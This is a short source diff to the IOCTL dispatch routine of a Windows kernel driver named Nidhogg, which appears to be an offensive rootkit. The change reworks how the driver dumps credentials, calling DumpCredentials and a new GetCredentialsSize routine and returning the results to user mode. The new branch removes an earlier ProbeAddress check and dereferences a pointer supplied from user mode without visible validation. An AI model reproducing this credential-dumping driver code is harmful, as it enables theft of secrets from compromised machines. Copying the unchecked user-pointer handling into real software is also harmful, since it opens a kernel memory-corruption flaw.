@@ -1156,18 +1156,23 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	{
 		ULONG size = stack->Parameters.DeviceIoControl.OutputBufferLength;
 
-		if (size == sizeof(SIZE_T)) {
-			SIZE_T sizeToAlloc = 0;
-			auto data = static_cast<SIZE_T*>(Irp->AssociatedIrp.SystemBuffer);
-			status = NidhoggMemoryHandler->DumpCredentials(&sizeToAlloc);
+		if (size == sizeof(IoctlCredentialsInfoSize)) {
+			auto data = static_cast<IoctlCredentialsInfoSize*>(Irp->AssociatedIrp.SystemBuffer);
+			status = NidhoggMemoryHandler->DumpCredentials(data);
+		}
+		else if (size == sizeof(IoctlCredentialsSize)) {
+			auto data = static_cast<PVOID*>(Irp->AssociatedIrp.SystemBuffer);
 
-			if (NT_SUCCESS(status)) {
-				status = ProbeAddress(data, sizeof(SIZE_T), sizeof(SIZE_T));
-
-				if (NT_SUCCESS(status))
-					*data = sizeToAlloc;
-				Print(DRIVER_PREFIX "Need %llu bytes to dump credentials.\n", sizeToAlloc);
+			if (!data) {
+				status = STATUS_INVALID_PARAMETER;
+				break;
 			}
+			PVOID credentialsSizeAddress = *data;
+			IoctlCredentialsSize* credentialsSize = static_cast<IoctlCredentialsSize*>(credentialsSizeAddress);
+			status = NidhoggMemoryHandler->GetCredentialsSize(credentialsSize);
+
+			if (NT_SUCCESS(status))
+				Print(DRIVER_PREFIX "Dumped credentials size successfully.\n");
 		}
 		else if (size == sizeof(IoctlCredentialsInformation)) {
 			auto data = static_cast<IoctlCredentialsInformation*>(Irp->AssociatedIrp.SystemBuffer);
